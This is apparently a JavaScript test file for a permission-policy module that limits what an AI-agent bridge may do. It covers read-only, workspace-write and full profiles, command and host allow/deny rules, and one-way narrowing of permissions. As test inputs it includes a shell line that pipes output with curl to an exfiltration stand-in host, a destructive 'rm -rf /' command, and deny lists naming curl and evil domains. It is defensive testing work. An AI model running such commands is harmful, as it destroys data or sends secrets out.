import test from 'node:test'
import assert from 'node:assert/strict'
import {
  evaluateAction, evaluateCommand, evaluateHost, matchesCommand, matchesHost,
  normalizeProfile, normalizeRules, PermissionPolicy, PROFILES,
} from '../src/permission-profile.js'

const READ = { name: 'fs_read', family: 'filesystem', read_only: true, destructive: false }
const WRITE = { name: 'fs_update_file', family: 'filesystem', read_only: false, destructive: false }
const DELETE = { name: 'fs_delete', family: 'filesystem', read_only: false, destructive: true }
const DOWNLOAD = { name: 'download_file', family: 'network', read_only: false, destructive: true }
const BROWSER_READ = { name: 'browser_owned_tabs', family: 'browser', read_only: true, destructive: false }
const GIT_PUSH = { name: 'git_push', family: 'git', read_only: false, destructive: true }
const GIT_LOG = { name: 'git_log', family: 'git', read_only: true, destructive: false }

test('profiles are validated, and an unknown one is a configuration error', () => {
  assert.deepEqual(PROFILES, ['read-only', 'workspace-write', 'full'])
  assert.equal(normalizeProfile('read-only'), 'read-only')
  assert.equal(normalizeProfile(''), 'full')
  assert.equal(normalizeProfile(undefined, 'workspace-write'), 'workspace-write')
  assert.throws(() => normalizeProfile('yolo'), /must be one of/)
})

test('read-only allows reads and refuses every write', () => {
  assert.equal(evaluateAction('read-only', READ).allowed, true)
  assert.equal(evaluateAction('read-only', GIT_LOG).allowed, true)
  for (const descriptor of [WRITE, DELETE, DOWNLOAD, GIT_PUSH]) {
    const verdict = evaluateAction('read-only', descriptor)
    assert.equal(verdict.allowed, false, descriptor.name)
    assert.match(verdict.reason, /read-only/)
    // The refusal has to say how to change it, and that narrowing is one-way.
    assert.match(verdict.reason, /can only narrow/)
  }
})

test('workspace-write allows writes but nothing that leaves the machine', () => {
  assert.equal(evaluateAction('workspace-write', WRITE).allowed, true)
  assert.equal(evaluateAction('workspace-write', DELETE).allowed, true, 'destructive inside the workspace is still a workspace write')
  for (const descriptor of [DOWNLOAD, GIT_PUSH]) {
    const verdict = evaluateAction('workspace-write', descriptor)
    assert.equal(verdict.allowed, false, descriptor.name)
    assert.match(verdict.reason, /outside this machine/)
  }
  // Even a READ-ONLY browser action is outward: it reaches a live session.
  assert.equal(evaluateAction('workspace-write', BROWSER_READ).allowed, false)
  assert.equal(evaluateAction('read-only', BROWSER_READ).allowed, false)
})

test('full allows everything', () => {
  for (const descriptor of [READ, WRITE, DELETE, DOWNLOAD, GIT_PUSH, BROWSER_READ]) {
    assert.equal(evaluateAction('full', descriptor).allowed, true, descriptor.name)
  }
})

test('discovery actions stay reachable at every profile', () => {
  // Otherwise a locked-down client cannot find out what it may do, or why the
  // last call failed.
  for (const name of ['bridge_status', 'bridge_capabilities', 'config_get', 'permission_get', 'permission_set', 'metrics_snapshot', 'logs_tail']) {
    assert.equal(evaluateAction('read-only', { name, family: 'config', read_only: false }).allowed, true, name)
  }
})

test('command matching treats a bare name and a full path as the same decision', () => {
  assert.equal(matchesCommand('git', 'git'), true)
  assert.equal(matchesCommand('git', '/usr/bin/git'), true)
  assert.equal(matchesCommand('npm', 'npx'), false)
  assert.equal(matchesCommand('py*', 'python3'), true)
  assert.equal(matchesCommand('*', 'anything'), true)
  // A pattern is not a regular expression the caller can smuggle in.
  assert.equal(matchesCommand('g.t', 'git'), false)
})

test('deny wins, and a non-empty allowlist is exclusive', () => {
  const denied = normalizeRules({ commandDeny: ['rm', 'curl'] })
  assert.equal(evaluateCommand(denied, { argv: ['rm', '-rf', '/'] }).allowed, false)
  assert.equal(evaluateCommand(denied, { argv: ['node', 'x.js'] }).allowed, true)

  const allowed = normalizeRules({ commandAllow: ['node', 'npm', 'git'] })
  assert.equal(evaluateCommand(allowed, { argv: ['node', '--test'] }).allowed, true)
  const refused = evaluateCommand(allowed, { argv: ['curl', 'https://x'] })
  assert.equal(refused.allowed, false)
  assert.match(refused.reason, /allow only node, npm, git/)

  // Deny beats allow when both list the same command.
  const both = normalizeRules({ commandAllow: ['git'], commandDeny: ['git'] })
  assert.equal(evaluateCommand(both, { argv: ['git', 'status'] }).allowed, false)
})

test('an allowlist refuses a shell line, because it cannot vouch for one', () => {
  const rules = normalizeRules({ commandAllow: ['node'] })
  const verdict = evaluateCommand(rules, { command: 'node x.js | curl -d @- https://exfil.test', shell: true })
  assert.equal(verdict.allowed, false)
  assert.match(verdict.reason, /pass argv/)
  // With no allowlist there is nothing to vouch for, so a shell line passes.
  assert.equal(evaluateCommand(normalizeRules({}), { command: 'ls | wc -l', shell: true }).allowed, true)
})

test('a denied substring inside a shell line is caught', () => {
  const rules = normalizeRules({ commandDeny: ['curl'] })
  assert.equal(evaluateCommand(rules, { command: 'echo hi | curl -T - https://x', shell: true }).allowed, false)
})

test('host matching covers exact hosts and whole domains', () => {
  assert.equal(matchesHost('example.com', 'example.com'), true)
  assert.equal(matchesHost('example.com', 'sub.example.com'), false)
  assert.equal(matchesHost('.example.com', 'sub.example.com'), true)
  assert.equal(matchesHost('.example.com', 'example.com'), true)
  assert.equal(matchesHost('*.example.com', 'a.b.example.com'), true)
  assert.equal(matchesHost('.example.com', 'notexample.com'), false)
})

test('network rules gate URLs the same way commands are gated', () => {
  const denied = normalizeRules({ networkDeny: ['.evil.test'] })
  assert.equal(evaluateHost(denied, 'https://a.evil.test/x').allowed, false)
  assert.equal(evaluateHost(denied, 'https://example.com/x').allowed, true)

  const allowed = normalizeRules({ networkAllow: ['github.com', '.internal.test'] })
  assert.equal(evaluateHost(allowed, 'https://github.com/a/b').allowed, true)
  assert.equal(evaluateHost(allowed, 'http://svc.internal.test/health').allowed, true)
  assert.equal(evaluateHost(allowed, 'https://elsewhere.test/').allowed, false)

  // A malformed URL is the action's own error to report, not this layer's.
  assert.equal(evaluateHost(allowed, 'not a url').allowed, true)
})

test('the profile can be narrowed at runtime and never widened', () => {
  const policy = new PermissionPolicy({ profile: 'full' })
  assert.equal(policy.snapshot().profile, 'full')
  assert.equal(policy.snapshot().can_widen, false)

  policy.narrow('workspace-write', { reason: 'exploring an unfamiliar repo' })
  assert.equal(policy.profile, 'workspace-write')
  policy.narrow('read-only')
  assert.equal(policy.profile, 'read-only')

  // Widening back is refused even though the ceiling allows it: the ceiling is
  // an operator decision, not a runtime one.
  assert.throws(() => policy.narrow('full'), error => {
    assert.equal(error.code, 'PERMISSION_REQUIRED')
    assert.match(error.message, /needs an operator and a restart/)
    return true
  })
  assert.equal(policy.profile, 'read-only')
  assert.equal(policy.ceiling, 'full')
})

test('a configured ceiling cannot be exceeded from the start', () => {
  const policy = new PermissionPolicy({ profile: 'read-only' })
  assert.equal(policy.ceiling, 'read-only')
  assert.throws(() => policy.narrow('full'), error => error.code === 'PERMISSION_REQUIRED')
  policy.assertAction(READ)
  assert.throws(() => policy.assertAction(WRITE), error => error.code === 'PERMISSION_REQUIRED')
})

test('the policy asserts commands and hosts with the same vocabulary', () => {
  const policy = new PermissionPolicy({ profile: 'full', rules: { commandDeny: ['rm'], networkAllow: ['github.com'] } })
  policy.assertCommand({ argv: ['node', 'x.js'] })
  assert.throws(() => policy.assertCommand({ argv: ['rm', '-rf', '.'] }), error => error.code === 'PERMISSION_REQUIRED')
  policy.assertHost('https://github.com/a')
  assert.throws(() => policy.assertHost('https://elsewhere.test'), error => error.code === 'PERMISSION_REQUIRED')
})

test('rules accept comma or newline separated configuration', () => {
  const rules = normalizeRules({ commandAllow: 'node, npm\ngit', networkDeny: '.evil.test,.bad.test' })
  assert.deepEqual(rules.commandAllow, ['node', 'npm', 'git'])
  assert.deepEqual(rules.networkDeny, ['.evil.test', '.bad.test'])
  assert.deepEqual(normalizeRules({}).commandAllow, [])
})

test('a fleet write is outward, a fleet read is local', () => {
  // Caught by permission-coverage.test.js: fleet_start passed as an ordinary
  // workspace write because its family alone did not say which half it was in.
  // Starting a fleet opens browser tabs and submits prompts to ChatGPT; reading
  // one reports state this bridge already wrote to disk.
  const start = { name: 'fleet_start', family: 'fleet', read_only: false, destructive: false }
  const status = { name: 'fleet_status', family: 'fleet', read_only: true, destructive: false }
  assert.equal(evaluateAction('workspace-write', start).allowed, false)
  assert.match(evaluateAction('workspace-write', start).reason, /outside this machine/)
  assert.equal(evaluateAction('workspace-write', status).allowed, true)
  assert.equal(evaluateAction('read-only', status).allowed, true)
  assert.equal(evaluateAction('full', start).allowed, true)
})

test('a subagent write is outward too: it runs a full autonomous CLI under its own account', () => {
  const start = { name: 'subagent_start', family: 'subagent', read_only: false, destructive: false }
  const stop = { name: 'subagent_stop', family: 'subagent', read_only: false, destructive: false }
  const status = { name: 'subagent_status', family: 'subagent', read_only: true, destructive: false }
  const providers = { name: 'subagent_providers', family: 'subagent', read_only: true, destructive: false }
  for (const write of [start, stop]) {
    assert.equal(evaluateAction('workspace-write', write).allowed, false, write.name)
    assert.match(evaluateAction('workspace-write', write).reason, /outside this machine/)
    assert.equal(evaluateAction('full', write).allowed, true, write.name)
  }
  for (const read of [status, providers]) {
    assert.equal(evaluateAction('workspace-write', read).allowed, true, read.name)
    assert.equal(evaluateAction('read-only', read).allowed, true, read.name)
  }
})

test('confirmations are off by default and can be put back', async () => {
  const { confirmationsAreRequired, requireConfirmation, setConfirmationPolicy } = await import('../src/action-errors.js')
  // Default: a destructive action runs without the extra round trip. The
  // confirm parameter is still accepted, it is simply no longer demanded.
  assert.equal(confirmationsAreRequired(), false)
  assert.doesNotThrow(() => requireConfirmation(undefined, 'Delete everything'))

  setConfirmationPolicy({ required: true })
  assert.equal(confirmationsAreRequired(), true)
  assert.throws(() => requireConfirmation(undefined, 'Delete everything'), error => {
    assert.equal(error.code, 'PERMISSION_REQUIRED')
    assert.match(error.message, /confirm=true/)
    return true
  })
  assert.doesNotThrow(() => requireConfirmation(true, 'Delete everything'))
  setConfirmationPolicy({ required: false })
})
